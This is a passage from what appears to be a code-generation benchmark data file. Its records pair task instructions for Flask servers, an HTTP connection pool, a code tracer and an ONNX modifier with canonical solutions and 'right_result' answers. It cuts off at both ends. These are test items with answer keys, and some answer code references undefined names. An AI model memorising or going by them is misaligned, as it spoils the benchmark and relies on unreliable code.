getattr(e, 'errno', None) not in {errno.EPIPE, errno.ESHUTDOWN, errno.EPROTOTYPE}:\n                raise\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, 'sock', None):\n            if read_timeout == 0:\n                raise ReadTimeoutError(\n                    self, url, f\"Read timed out. (read timeout={read_timeout}\"\n                )\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=read_timeout)\n            raise\n\n        return httplib_response\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        chunked=False,\n        **response_kw\n    ):\n        parsed_url = parse_url(url)\n        if headers is None:\n            headers = self.headers\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, redirect=redirect, default=self.retries)\n\n        if assert_same_host and not self.is_same_host(url):\n            raise HostChangedError(self, url, retries)\n\n        conn = None\n        release_this_conn = release_conn\n        clean_exit = False\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._new_conn()\n            conn.timeout = timeout_obj.connect_timeout\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers,\n                chunked=chunked,\n            )\n\n            clean_exit = True\n\n        except EmptyPoolError:\n            clean_exit = True\n            release_this_conn = False\n            raise\n\n        except (\n            SocketError,\n            ProtocolError,\n            MaxRetryError,\n            SSLError,\n            ProxyError,\n        ) as e:\n            clean_exit = False\n            if isinstance(e, (SocketError, ProtocolError)):\n                e = ProtocolError(\"Connection aborted.\", e)\n\n            retries = retries.increment(\n                method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\n            )\n            retries.sleep()\n            err = e\n\n        finally:\n            if not clean_exit:\n                conn = conn and conn.close()\n                release_this_conn = True\n\n            if release_this_conn:\n                self._put_conn(conn)\n\n        if not conn:\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                redirect,\n                assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                **response_kw\n            )\n\n        return httplib_response",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import socket\nfrom http.client import HTTPConnection, HTTPSConnection, HTTPResponse\nfrom urllib.parse import urlparse\nfrom typing import Optional, Dict, Any, Union\nimport time\n\nclass Timeout:\n    DEFAULT_TIMEOUT = 5.0\n\nclass Retry:\n    def __init__(self, total=3, backoff_factor=0.5):\n        self.total = total\n        self.backoff_factor = backoff_factor\n\nclass HTTPConnectionPool:\n    def __init__(self, host: str, port: Optional[int] = None, \n                 timeout: Union[float, Timeout] = Timeout.DEFAULT_TIMEOUT, \n                 maxsize: int = 1, block: bool = False, headers: Optional[Dict] = None,\n                 retries: Optional[Retry] = None, _proxy: Optional[str] = None, \n                 _proxy_headers: Optional[Dict] = None, **conn_kw):\n        self.host = host\n        self.port = port\n        self.timeout = timeout if isinstance(timeout, (int, float)) else timeout.DEFAULT_TIMEOUT\n        self.retries = retries if retries is not None else Retry()\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n        self.scheme = 'https' if conn_kw.get('secure', False) else 'http'\n        self.pool = []\n        self.maxsize = maxsize\n        self.block = block\n        self.headers = headers or {}\n\n    def _new_conn(self) -> Union[HTTPConnection, HTTPSConnection]:\n        if self.scheme == 'https':\n            return HTTPSConnection(self.host, self.port, timeout=self.timeout, **self.conn_kw)\n        else:\n            return HTTPConnection(self.host, self.port, timeout=self.timeout, **self.conn_kw)\n\n    def _make_request(self, conn: Union[HTTPConnection, HTTPSConnection], method: str, url: str, \n                      timeout: Union[float, _Default] = _Default, chunked: bool = False, \n                      **httplib_request_kw) -> HTTPResponse:\n        try:\n            conn.request(method, url, **httplib_request_kw)\n            return conn.getresponse()\n        except socket.timeout:\n            raise Exception(\"Request timed out\")\n\n    def urlopen(self, method: str, url: str, body: Optional[Any] = None, headers: Optional[Dict] = None,\n                retries: Optional[Retry] = None, redirect: bool = True, assert_same_host: bool = True,\n                timeout: Union[float, _Default] = _Default, pool_timeout: Optional[float] = None,\n                release_conn: Optional[bool] = None, chunked: bool = False, **response_kw) -> HTTPResponse:\n        \n        retries = retries if retries is not None else self.retries\n        \n        parsed_url = urlparse(url)\n        if assert_same_host and parsed_url.hostname != self.host:\n            raise Exception(f\"URL hostname {parsed_url.hostname} doesn't match connection pool host {self.host}\")\n\n        for attempt in range(retries.total):\n            try:\n                conn = self._new_conn()\n                try:\n                    return self._make_request(conn, method, url, timeout=timeout, chunked=chunked, **response_kw)\n                finally:\n                    if release_conn:\n                        conn.close()\n            except Exception as e:\n                if attempt < retries.total - 1:\n                    sleep_time = retries.backoff_factor * (2 ** attempt)\n                    time.sleep(sleep_time)\n                else:\n                    raise e\n        raise Exception(\"Failed to complete request after maximum retries\")"
  },
  {
    "Task_id": 160,
    "Instruction": "Task Description: Create a custom Flask application class that extends the base Flask class to provide enhanced request handling and response generation capabilities, particularly for API responses.\n\nClass Description: FlaskApp is a subclass of Flask that customizes request handling and response generation. It provides automatic JSON serialization of responses and convenience methods for defining routes.\n\nAttributes:\n- request_class: [Request] - Custom request class to use for incoming requests\n- json_data_class: [tuple] - Tuple of classes that should be automatically converted to JSON responses\n\nMethods:\n- make_response(rv) -> Response - Overrides the base make_response method to automatically convert supported data types to JSON responses\n  Input: \n    rv: [Any] - The response value to process\n  Output:\n    Response object with appropriate content type and serialized data\n\n- get(rule, **options) -> decorator - Convenience method for creating GET routes\n  Input:\n    rule: [str] - URL rule as string\n    **options: [dict] - Additional options to pass to route()\n  Output:\n    Route decorator for GET method\n\n- post(rule, **options) -> decorator - Convenience method for creating POST routes\n  Input:\n    rule: [str] - URL rule as string\n    **options: [dict] - Additional options to pass to route()\n  Output:\n    Route decorator for POST method",
    "Canonical_solution": "from flask import Flask, Response\nfrom peewee import ModelSelect, Model\nfrom domain_admin.compat import Iterator\nfrom domain_admin.utils.flask_ext.api_result import ApiResult\nfrom domain_admin.utils.flask_ext.request import Request\nimport six\n\nclass FlaskApp(Flask):\n    request_class = Request\n\n    json_data_class = (\n        ModelSelect,\n        Model,\n        Iterator,\n        list,\n        dict,\n        six.integer_types,\n        six.text_type\n    )\n\n    def make_response(self, rv):\n        if isinstance(rv, self.json_data_class) or rv is None:\n            rv = ApiResult.success(rv)\n\n        if isinstance(rv, ApiResult):\n            return Response(rv.to_json(), content_type='application/json;charset=utf-8')\n\n        return super(FlaskApp, self).make_response(rv)\n\n    def get(self, rule, **options):\n        options.setdefault('methods', ['GET'])\n        return super(FlaskApp, self).route(rule, **options)\n\n    def post(self, rule, **options):\n        options.setdefault('methods', ['POST'])\n        return super(FlaskApp, self).route(rule, **options)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, Request, Response, json\nimport functools\n\nclass FlaskApp(Flask):\n    request_class = Request\n    json_data_class = (dict, list, tuple, set)\n\n    def make_response(self, rv):\n        if isinstance(rv, self.json_data_class):\n            return Response(json.dumps(rv), content_type='application/json')\n        return super().make_response(rv)\n\n    def get(self, rule, **options):\n        options.setdefault('methods', ['GET'])\n        return self.route(rule, **options)\n\n    def post(self, rule, **options):\n        options.setdefault('methods', ['POST'])\n        return self.route(rule, **options)"
  },
  {
    "Task_id": 162,
    "Instruction": "Task Description: Create a Flask-based API server that can handle multiple routes for status checking, input processing, and server management, with the ability to run in a separate thread or using a production server.\n\nClass Description: FlaskAPI is a class that encapsulates a Flask web server with custom routes for handling API requests. It provides methods to start and stop the server either in a development thread or using a production-ready server (Waitress).\n\nAttributes:\n- app: Flask - The Flask application instance\n- server_thread: ServerThread - Thread object for running the development server\n\nMethods:\n- __init__() -> None - Initializes the Flask application and sets up routes\n- _setup_routes() -> None - Defines the API endpoints and their handlers\n- _the_input(text: str, screen: str, talk: str) -> dict - Processes input text and optional screenshot, returns response\n- start_api(api: bool = False) -> None - Starts the server either in a thread (api=False) or using Waitress (api=True)\n- stop_api() -> None - Stops the running server thread\n\nNested Class: ServerThread\nClass Description: A thread class for running the Flask development server in a separate thread.\n\nAttributes:\n- srv: WSGIServer - The Werkzeug development server instance\n- ctx: AppContext - Flask application context\n\nMethods:\n- __init__(app: Flask, host: str, port: int) -> None - Initializes the server thread with Flask app and connection details\n- run() -> None - Starts the server and runs it indefinitely\n- shutdown() -> None - Stops the running server",
    "Canonical_solution": "from flask import Flask, request, jsonify\nimport threading\nfrom werkzeug.serving import make_server\nfrom waitress import serve\n\nclass FlaskAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.server_thread = None\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route(\"/status\", methods=[\"POST\"])\n        def status():\n            return jsonify({\"response\": True})\n\n        @self.app.route(\"/input\", methods=[\"POST\"])\n        def input():\n            data = request.json\n            text = data[\"text\"]\n            screen = data[\"screen\"]\n            talk = data[\"talk\"]\n            return self._the_input(text, screen, talk)\n\n        @self.app.route(\"/stop_server\", methods=[\"POST\"])\n        def stop_server():\n            self.stop_api()\n            exit(0)\n\n    def _the_input(self, text, screen, talk):\n        print(\"Input:\", text)\n        from .agent.process import process_text_api\n        from .utils.db import screenshot_path\n\n        if screen != \"true\":\n            result = process_text_api(text, None)\n        else:\n            import pyautogui\n            screenshot = pyautogui.screenshot()\n            screenshot.save(screenshot_path)\n            result = process_text_api(text, screenshot_path)\n\n        return jsonify({\"response\": result})\n\n    def start_api(self, api=False):\n        if api == False:\n            if self.server_thread is None:\n                self.server_thread = ServerThread(self.app, \"0.0.0.0\", 7541)\n                self.server_thread.start()\n                print(\"API started\")\n            else:\n                print(\"API is already running\")\n        else:\n            serve(self.app, host=\"0.0.0.0\", port=7541)\n\n    def stop_api(self):\n        if self.server_thread is not None:\n            self.server_thread.shutdown()\n            self.server_thread.join()\n            self.server_thread = None\n            print(\"API stopped\")\n        else:\n            print(\"API is not running\")\n\nclass ServerThread(threading.Thread):\n    def __init__(self, app, host, port):\n        threading.Thread.__init__(self)\n        self.srv = make_server(host, port, app)\n        self.ctx = app.app_context()\n        self.ctx.push()\n\n    def run(self):\n        print(\"Starting server\")\n        self.srv.serve_forever()\n\n    def shutdown(self):\n        print(\"Stopping server\")\n        self.srv.shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify, abort\nfrom threading import Thread\nfrom werkzeug.serving import make_server\nfrom waitress import serve\n\nclass FlaskAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.server_thread = None\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route('/status', methods=['GET'])\n        def status():\n            return jsonify({\"status\": \"running\"})\n\n        @self.app.route('/input', methods=['POST'])\n        def process_input():\n            data = request.get_json()\n            if not data or 'text' not in data:\n                abort(400)\n            text = data.get('text')\n            screen = data.get('screen')\n            talk = data.get('talk')\n            result = self._the_input(text=text, screen=screen, talk=talk)\n            return jsonify(result)\n\n        @self.app.route('/stop', methods=['POST'])\n        def stop_server():\n            self.stop_api()\n            return jsonify({\"status\": \"stopping\", \"message\": \"Server is shutting down...\"})\n\n    def _the_input(self, text: str, screen: str = None, talk: str = None):\n        response = {\"received_text\": text}\n        if screen:\n            response[\"screenshot\"] = screen\n        if talk:\n            response[\"tts\"] = talk\n        return response\n\n    def start_api(self, api=False):\n        if self.server_thread and self.server_thread.is_alive():\n            return\n        host = '127.0.0.1'\n        port = 5000\n        if api:\n            serve(self.app, host=host, port=port)\n        else:\n            self.server_thread = self.ServerThread(self.app, host, port)\n            self.server_thread.start()\n\n    def stop_api(self):\n        if self.server_thread and self.server_thread.is_alive():\n            self.server_thread.shutdown()\n            self.server_thread = None\n\n    class ServerThread(Thread):\n        def __init__(self, app, host, port):\n            super().__init__()\n            self.srv = make_server(host, port, app)\n            self.ctx = app.app_context()\n            self.ctx.push()\n\n        def run(self):\n            self.srv.serve_forever()\n\n        def shutdown(self):\n            self.srv.shutdown()"
  },
  {
    "Task_id": 163,
    "Instruction": "Task Description: Create a Flask-based web service that accepts POST requests with form data, processes the data using a pre-trained machine learning model, and returns a prediction result rendered in an HTML template.\n\nFunction Description: The `predict` function is a Flask route handler that processes incoming POST requests containing form data. It extracts the input values, converts them to a format suitable for the machine learning model, makes a prediction, and returns the result embedded in an HTML template.\n\nInput: \n- The function receives form data via Flask's request object (implicit input through `request.form.values()`)\n- The form data should contain numerical values that can be converted to floats\n\nOutput:\n- Returns a rendered HTML template ('index.html') with the prediction result embedded in the template variable `prediction_text`\n- The output is a string containing the prediction percentage formatted as \"Percent with heart disease is X.XX\" where X.XX is the rounded prediction value",
    "Canonical_solution": "import numpy as np\nfrom flask import Flask, request, render_template\nimport pickle\n\napp = Flask(__name__)\nmodel = pickle.load(open('models/model.pkl', 'rb'))\n\n@app.route('/predict',methods=['POST'])\ndef predict():\n    int_features = [float(x) for x in request.form.values()]\n    features = [np.array(int_features)]\n    prediction = model.predict(features)\n    output = round(prediction[0], 2)\n    return render_template('index.html', prediction_text='Percent with heart disease is {}'.format(output))\n\nif __name__ == \"__main__\":\n    app.run()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, render_template\nimport numpy as np\nimport pickle\n\napp = Flask(__name__)\nmodel = pickle.load(open('model.pkl', 'rb'))\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    float_features = [float(x) for x in request.form.values()]\n    features = [np.array(float_features)]\n    prediction = model.predict_proba(features)[:,1][0]\n    return render_template('index.html', prediction_text=f'Percent with heart disease is {prediction:.2f}')"
  },
  {
    "Task_id": 164,
    "Instruction": "Task Description: Create a Python function that sets up a real-time code tracing and visualization system using Flask to serve a web interface for monitoring execution patterns.\n\nFunction Description: The `trace` function establishes a web-based visualization tool that tracks and displays Python code execution in real-time. It creates a Flask web server that shows which lines of code are being executed most frequently, with features like heatmap visualization and stack trace inspection. The function uses Python's sys.settrace() mechanism to monitor execution and organizes the data for web display.\n\nInput:\n- files: [Optional callable] - A function to filter which files should be traced (default: None)\n- port: [int] - Port number for the web server (default: 9999)\n- host: [str] - Host address for the server (default: '127.0.0.1')\n- browser: [bool] - Whether to automatically open browser (default: False)\n- daemon: [bool] - Whether to run server as daemon thread (default: False)\n\nOutput:\n- None (The function runs indefinitely, serving the web interface and collecting trace data)\n\nThe function:\n1. Sets up tracing for the calling frame and specified files\n2. Creates a Flask web server with multiple routes for visualization\n3. Starts a background thread for the web server\n4. Configures sys.settrace() to collect execution data\n5. Optionally opens a browser window to display the visualization",
    "Canonical_solution": "import inspect\nimport logging\nimport sys\nimport threading\nimport webbrowser\nfrom collections import defaultdict, deque, Counter\nfrom functools import lru_cache\nfrom itertools import islice, takewhile\nfrom flask import Flask, render_template, jsonify, url_for, request\n\ndef trace(\n        files=None,\n        port=9999,\n        host='127.0.0.1',\n        browser=False,\n        daemon=False,\n):\n    calling_frame = inspect.currentframe().f_back\n    calling_file = calling_frame.f_code.co_filename\n\n    @lru_cache(maxsize=None)\n    def include_file(path):\n        try:\n            return path == calling_file or files(path)\n        except Exception:\n            return False\n\n    thread_ident = threading.get_ident()\n    queues = defaultdict(lambda: deque(maxlen=2 ** 10))\n    totals = defaultdict(Counter)\n\n    app = Flask(__name__)\n\n    host_is_local = host in [\"127.0.0.1\", \"localhost\"]\n    if host_is_local:\n        app.config[\"SERVER_NAME\"] = \"{host}:{port}\".format(host=host, port=port)\n\n    @app.route('/')\n    def index():\n        return render_template('index.html', files=sorted(queues.keys()))\n\n    @app.route('/file/')\n    def file_view():\n        return render_template(\"file.html\", **file_table_context())\n\n    def file_table_context():\n        filename = request.args['filename']\n        source = Source.for_filename(filename)\n        queue = queues[filename]\n\n        highlighted = highlight_ranges(source, frames_matching(filename))\n        highlighted_lines = list(enumerate(highlighted.splitlines()))\n        \n        counters = [\n            queue_counter(queue, 2 ** i)\n            for i in range(10 + 1)\n        ]\n\n        ratios = [\n            [\n                counter[i + 1] / min(2 ** c, len(queue) or 1)\n                * (c + 1) / 10\n                for c, counter in enumerate(counters)\n            ]\n            for i, _ in highlighted_lines\n        ]\n\n        max_ratio = max(map(max, ratios)) or 1\n\n        rows = [\n            (\n                i + 1,\n                totals[filename][i + 1] or '',\n                reversed([\n                    int(round(ratio / max_ratio * 100))\n                    for ratio in ratios[i]\n                ]),\n                line,\n            )\n            for i, line in highlighted_lines\n        ]\n\n        return dict(\n            rows=rows,\n            zip=zip,\n            lightnesses=[int((i + 1) * 100 / (10 + 1)) for i in range(10 + 1)],\n            filename=filename,\n            highlighted=highlighted,\n        )\n\n    @app.route('/table/')\n    def file_table_view():\n        return render_template('file_table.html', **file_table_context())\n\n    def current_frame():\n        return sys._current_frames()[thread_ident]\n\n    def frames_matching(filename):\n        frame = current_frame()\n        while frame:\n            if frame.f_code.co_filename == filename:\n                yield frame\n            frame = frame.f_back\n\n    @app.route('/stacktrace/')\n    def stacktrace():\n        def gen():\n            frame = current_frame()\n            while frame:\n                code = frame.f_code\n                filename = code.co_filename\n                name = Source.for_frame(frame).code_qualname(code)\n                yield (\n                    filename,\n                    frame.f_lineno,\n                    name,\n                    highlight_stack_frame(frame),\n                    include_file(filename)\n                )\n                frame = frame.f_back\n\n        return jsonify(list(takewhile(\n            lambda entry: not (\n                    'heartrate' in entry[0]\n                    and entry[2].endswith(trace_func.__name__)),\n            list(gen())[::-1]\n        )))\n\n    threading.Thread(\n        target=lambda: app.run(\n            debug=False,\n            host=host,\n            port=port,\n        ),\n        daemon=daemon,\n    ).start()\n\n    def trace_func(frame, event, _arg):\n        filename = frame.f_code.co_filename\n        if event == \"call\":\n            if include_file(filename):\n                return trace_func\n\n        elif event == \"line\":\n            lineno = frame.f_lineno\n            queues[filename].append(lineno)\n            totals[filename][lineno] += 1\n            Source.lazycache(frame)\n\n    calling_frame.f_trace = trace_func\n    sys.settrace(trace_func)\n    \n    if browser and host_is_local:\n        with app.app_context():\n            url = url_for(\n                'file_view',\n                filename=calling_file,\n            )\n        webbrowser.open_new_tab(url)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "import sys\nimport threading\nimport time\nfrom flask import Flask, render_template_string, jsonify\nimport os\nfrom functools import wraps\n\ndef trace(files=None, port=9999, host='127.0.0.1', browser=True, daemon=False):\n    app = Flask(__name__)\n    execution_data = {}\n    stack_traces = []\n\n    def trace_lines(frame, event, arg):\n        if event == 'line':\n            co = frame.f_code\n            filename = co.co_filename\n            if files is None or files(filename):\n                key = (filename, frame.f_lineno)\n                execution_data[key] = execution_data.get(key, 0) + 1\n                stack = []\n                f = frame\n                while f:\n                    stack.append((f.f_code.co_filename, f.f_lineno))\n                    f = f.f_back\n                stack_traces.append(stack)\n        return trace_lines\n\n    def install_tracer():\n        sys.settrace(trace_lines)\n        for thread in threading.enumerate():\n            if thread is not threading.current_thread():\n                try:\n                    thread_id = thread.ident\n                    if thread_id:\n                        sys._current_frames()[thread_id].f_trace = trace_lines\n                except Exception:\n                    pass\n\n    @app.route('/')\n    def index():\n        template = '''\n        <!DOCTYPE html>\n        <html>\n        <head>\n            <title>Code Execution Tracer</title>\n            <style>\n                body { font-family: Arial, sans-serif; }\n                .file-section { margin-bottom: 30px; }\n                .filename { font-weight: bold; font-size: 18px; }\n                .line { padding: 2px 5px; white-space: pre; }\n                .hot { background-color: #ffcccc; }\n                .cold { background-color: #ffeeee; }\n            </style>\n        </head>\n        <body>\n            <h1>Execution Heatmap</h1>\n            {% for file in files %}\n                <div class=\"file-section\">\n                    <div class=\"filename\">{{ file }}</div>\n                    {% for line_num, text, count in lines[file] %}\n                        <div class=\"line{% if count > 0 %} {{ 'hot' if count > 1 else 'cold' }}{% endif %}\">\n                            L{{ line_num }} ({{ count }}x): {{ text }}\n                        </div>\n                    {% endfor %}\n                </div>\n            {% endfor %}\n            <h2>Recent Stack Traces</h2>\n            <ul>\n                {% for trace in stack_traces[-5:] %}\n                    <li>\n                        {% for frame in trace %}\n                            {{ frame[0] }}:L{{ frame[1] }}\n                        {% endfor %}\n                    </li>\n                {% endfor %}\n            </ul>\n            <script>\n                setTimeout(() => location.reload(), 5000);\n            </script>\n        </body>\n        </html>\n        '''\n        files_content = {}\n        all_files = set(f for f, _ in execution_data.keys())\n        for file in all_files:\n            with open(file, 'r') as f:\n                lines = list(f.readlines())\n            counted_lines = [(i+1, line.strip('\\n'), execution_data.get((file, i+1), 0)) for i, line in enumerate(lines)]\n            files_content[file] = counted_lines\n        return render_template_string(template, files=all_files, lines=files_content, stack_traces=stack_traces)\n\n    def run_server():\n        app.run(host=host, port=port)\n\n    server_thread = threading.Thread(target=run_server, daemon=daemon)\n    server_thread.start()\n\n    if browser:\n        import webbrowser\n        time.sleep(0.5)\n        webbrowser.open(f'http://{host}:{port}')\n\n    install_tracer()\n    while True:\n        time.sleep(1)"
  },
  {
    "Task_id": 165,
    "Instruction": "Task Description: Create a Flask-based HTTP server class for handling ONNX model modification requests, including opening models, applying modifications, and providing download functionality.\n\nClass Description: ONNXModifierServer is a Flask application wrapper that provides endpoints for uploading ONNX models, modifying them, and downloading the modified versions. It maintains the model state between requests and handles file operations.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- onnx_modifier: [onnxModifier|None] - The current ONNX model being processed (None when no model loaded)\n\nMethods:\n- __init__: [constructor]() -> [None] - Initializes the Flask app and sets up routes\n- _setup_routes: [method]() -> [None] - Configures URL routes and their handler methods\n- index: [method]() -> [str] - Returns the main HTML interface (renders index.html template)\n- open_model: [method]() -> [tuple[str, int]] - Handles file upload, creates onnxModifier instance from uploaded file (expects 'file' in request.files)\n- modify_and_download_model: [method]() -> [str] - Applies modifications from JSON request (request.get_json()), saves model, returns save path\n- run: [method](host: str='127.0.0.1', port: int=5000, debug: bool=False) -> [None] - Starts the Flask development server with specified parameters",
    "Canonical_solution": "from flask import Flask, request, render_template\n\nclass ONNXModifierServer:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.onnx_modifier = None\n        self._setup_routes()\n\n    def _setup_routes(self):\n        self.app.add_url_rule('/', 'index', self.index)\n        self.app.add_url_rule('/open_model', 'open_model', self.open_model, methods=['POST'])\n        self.app.add_url_rule('/download', 'modify_and_download_model', self.modify_and_download_model, methods=['POST'])\n\n    def index(self):\n        return render_template('index.html')\n\n    def open_model(self):\n        onnx_file = request.files['file']\n        self.onnx_modifier = onnxModifier.from_name_protobuf_stream(\n            onnx_file.filename, onnx_file.stream)\n        return 'OK', 200\n\n    def modify_and_download_model(self):\n        modify_info = request.get_json()\n        self.onnx_modifier.reload()\n        self.onnx_modifier.modify(modify_info)\n        save_path = self.onnx_modifier.check_and_save_model()\n        return save_path\n\n    def run(self, host='127.0.0.1', port=5000, debug=False):\n        self.app.run(host=host, port=port, debug=debug)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify, send_file, render_template_string\nimport os\nimport tempfile\nimport json\nimport onnx\nfrom onnx import ModelProto\n\nclass ONNXModifierServer:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.onnx_modifier = None\n        self._setup_routes()\n\n    def _setup_routes(self):\n        self.app.add_url_rule('/', 'index', self.index)\n        self.app.add_url_rule('/open', 'open_model', self.open_model, methods=['POST'])\n        self.app.add_url_rule('/modify_download', 'modify_and_download_model', self.modify_and_download_model, methods=['POST'])\n\n    def index(self):\n        return render_template_string('''\n            <!DOCTYPE html>\n            <html>\n            <head>\n                <title>ONNX Model Modifier</title>\n            </head>\n            <body>\n                <h1>Upload ONNX Model</h1>\n                <form action=\"/open\" method=\"post\" enctype=\"multipart/form-data\">\n                    <input type=\"file\" name=\"file\">\n                    <input type=\"submit\" value=\"Upload\">\n                </form>\n                \n                <h2>Modify Model</h2>\n                <form id=\"modifyForm\">\n                    <textarea id=\"modifications\" name=\"modifications\" rows=\"10\" cols=\"50\"></textarea><br>\n                    <button type=\"button\" onclick=\"sendModification()\">Apply Modifications</button>\n                </form>\n                \n                <p id=\"status\"></p>\n                <a id=\"downloadLink\" style=\"display:none;\" download=\"modified_model.onnx\">Download Modified Model</a>\n\n                <script>\n                    function sendModification() {\n                        const modifications = document.getElementById('modifications').value;\n                        \n                        fetch('/modify_download', {\n                            method: 'POST',\n                            headers: {\n                                'Content-Type': 'application/json'\n                            },\n                            body: modifications\n                        })\n                        .then(response => response.json())\n                        .then(data => {\n                            if (data.error) {\n                                document.getElementById('status').textContent = 'Error: ' + data.error;\n                                document.getElementById('downloadLink').style.display = 'none';\n                            } else {\n                                document.getElementById('status').textContent = 'Model modified successfully!';\n                                document.getElementById('downloadLink').href = data.file_path;\n                                document.getElementById('downloadLink').style.display = 'inline';\n                            }\n                        })\n                        .catch(error => {\n                            document.getElementById('status').textContent = 'Error: ' + error;\n                            document.getElementById('downloadLink').style.display = 'none';\n                        });\n                    }\n                </script>\n            </body>\n            </html>\n        ''')\n\n    def open_model(self):\n        if 'file' not in request.files:\n            return jsonify({\"error\": \"No file part\"}), 400\n            \n        file = request.files['file']\n        \n        if file.filename == '':\n            return jsonify({\"error\": \"No selected file\"}), 400\n            \n        try:\n            with tempfile.NamedTemporaryFile(delete=False) as tmpfile:\n                file.save(tmpfile.name)\n                model = onnx.load(tmpfile.name)\n                \n            self.onnx_modifier = ONNXModifier(model)\n            return jsonify({\"message\": \"Model loaded successfully\"})\n        except Exception as e:\n            return jsonify({\"error\": str(e)}), 500\n\n    def modify_and_download_model(self):\n        if self.onnx_modifier is None:\n            return jsonify({\"error\": \"No model loaded\"}), 400\n            \n        try:\n            modifications = request.get_json()\n            \n            if not isinstance(modifications, dict):\n                return jsonify({\"error\": \"Invalid JSON format\"}), 400\n                \n            # Example modification handling - this would need to be expanded\n            # based on what specific modifications you want to support\n            if 'metadata' in modifications:\n                for key, value in modifications['metadata'].items():\n                    meta = next((m for m in self.onnx_modifier.model.metadata_props if m.key == key), None)\n                    if meta:\n                        meta.value = str(value)\n                    else:\n                        new_meta = self.onnx_modifier.model.metadata_props.add()\n                        new_meta.key = key\n                        new_meta.value = str(value)\n            \n            # Save the modified model\n            save_path = self.onnx_modifier.save_modified_model()\n            \n            return jsonify({\n                \"message\": \"Model modified successfully\",\n                \"file_path\": save_path\n            })\n        except Exception as e:\n            return jsonify({\"error\": str(e)}), 500\n\n    def run(self, host='127.0.0.1', port=5000, debug=False):\n        self.app.run(host=host, port=port, debug=debug)\n\nclass ONNXModifier:\n    def __init__(self, model: ModelProto):\n        self.model = model\n        \n    def save_modified_model(self):\n        _, temp_path = tempfile.mkstemp(suffix='.onnx')\n        onnx.save(self.model, temp_path)\n        return temp_path\n\n# Example usage:\nif __name__ == '__main__':\n    server = ONNXModifierServer()\n    server.run(debug=True)"
  },
  {
    "Task_id": 166,
    "Instruction": "Task Description: Create a Flask-based HTTP server that implements a GraphQL endpoint with both GET and POST methods, including a GraphiQL playground interface for testing queries.\n\nFunction Description: The code implements two Flask route handlers for a GraphQL server. The first handles GET requests to serve a GraphiQL playground interface, while the second handles POST requests to process GraphQL queries and mutations.\n\nInput:\n- For GET /graphql: No input parameters (uses Flask's request object internally)\n- For POST /graphql: Expects JSON payload containing GraphQL query/mutation\n\nOutput:\n- For GET /graphql: Returns HTML content for GraphiQL playground (status 200)\n- For POST /graphql: Returns JSON response containing either:\n  - Successful query result (status 200)\n  - Error response (status 400) if query fails",
    "Canonical_solution": "from flask import Flask, jsonify, request\nfrom ariadne import graphql_sync\nfrom ariadne.explorer import ExplorerGraphiQL\n\napp = Flask(__name__)\napp.config.update(\n    {\n        \"TESTING\": True,\n    }\n)\n\nexplorer = ExplorerGraphiQL(title=\"My Flask GraphQL\")\n\n@app.route(\"/graphql\", methods=[\"GET\"])\ndef graphql_playground():\n    html = explorer.html(request)\n    return html, 200\n\n@app.route(\"/graphql\", methods=[\"POST\"])\ndef graphql_server():\n    data = request.get_json()\n    success, result = graphql_sync(\n        schema,\n        data,\n        context_value={\"request\": request},\n        root_value={\"hello\": \"Hello Flask!\"},\n        debug=app.debug,\n    )\n    status_code = 200 if success else 400\n    return jsonify(result), status_code",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify, render_template_string\nfrom graphql import graphql, build_schema\nimport json\n\napp = Flask(__name__)\n\n# Define a simple GraphQL schema\nschema = build_schema('''\n    type Query {\n        hello: String\n    }\n''')\n\n# Sample resolver\ndef resolve_hello():\n    return \"Hello, world!\"\n\nschema.query_type.fields['hello'].resolve = resolve_hello\n\n# GraphiQL HTML template\ngraphiql_html = '''\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <title>GraphiQL</title>\n    <link href=\"https://unpkg.com/graphiql/graphiql.min.css\" rel=\"stylesheet\">\n</head>\n<body style=\"margin:0;height:100%\">\n    <div id=\"graphiql\" style=\"height:100vh\"></div>\n    <script src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/graphiql/graphiql.min.js\"></script>\n    <script>\n        ReactDOM.render(\n            React.createElement(GraphiQL, {\n                fetcher: GraphiQL.createFetcher({ url: '/graphql' }),\n            }),\n            document.getElementById('graphiql')\n        );\n    </script>\n</body>\n</html>\n'''\n\n@app.route('/graphql', methods=['GET'])\ndef graphiql_playground():\n    return render_template_string(graphiql_html)\n\n@app.route('/graphql', methods=['POST'])\ndef graphql_server():\n    data = request.get_json()\n    \n    if not data:\n        return jsonify({'error': 'No 